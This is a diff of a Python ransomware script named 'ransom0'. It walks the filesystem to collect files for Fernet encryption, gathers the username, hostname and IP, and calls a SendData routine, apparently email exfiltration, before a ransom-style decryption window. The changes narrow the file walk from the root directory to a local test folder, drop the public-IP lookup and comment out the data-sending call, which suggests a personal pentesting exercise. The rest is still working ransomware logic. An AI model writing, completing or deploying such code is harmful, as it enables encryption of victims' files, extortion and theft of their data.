@@ -1,4 +1,3 @@
-
 import os, platform, smtplib, ssl, socket, shutil, time
 from os import system, name, path
 from cryptography.fernet import Fernet
@@ -19,7 +18,6 @@ class ransom0:
     username = os.getlogin()
     time_now = datetime.now().time()
     hostname = socket.gethostname()
-    IP = get('https://api.ipify.org').text
     PATH = os.getcwd()
 
 
@@ -77,7 +75,7 @@ class ransom0:
     def FindFiles(self):
         f = open("logs/path.txt", "w")
         cnt = 0
-        for root, dirs, files in os.walk("/"):
+        for root, dirs, files in os.walk("/Users/hugolb/Documents/Productivity/Pentesting/Ransomware/test_directory"):
             if any(s in root for s in self.EXCLUDE_DIRECTORY):
                 pass
             else:
@@ -126,9 +124,6 @@ ransom0 = ransom0()
 def StartRansom():
     try:
         ransom0.FindFiles()
-        f = open("logs/cnt.txt", "r")
-        cnt = f.read()
-        f.close()
         filepath = 'logs/path.txt'
         with open(filepath) as fp:
             line = fp.readline()
@@ -149,7 +144,7 @@ def StartRansom():
         StartRansom()
 
 StartRansom()
-ransom0.SendData()
+#ransom0.SendData()
 
 PATH = os.getcwd()
 
@@ -234,7 +229,6 @@ def DECRYPT_FILE():
         label1.config(background='black', foreground='red')
         canvas1.create_window(int(width/2), int(height/20)*15, window=label1)
         shutil.rmtree(PATH+'/logs', ignore_errors=True)
-        exit()
 
 
         canvas1.create_window(int(width/2), 340, window=label1)  
@@ -245,6 +239,7 @@ def DECRYPT_FILE():
     canvas1.create_window(int(width/2), int(height/20)*13, window=button1)
 
     root.mainloop()
+
 
 
 
@@ -261,4 +256,3 @@ if __name__ == '__main__':
         f.write(str(digits))
         f.close()
         StartRansom()
-
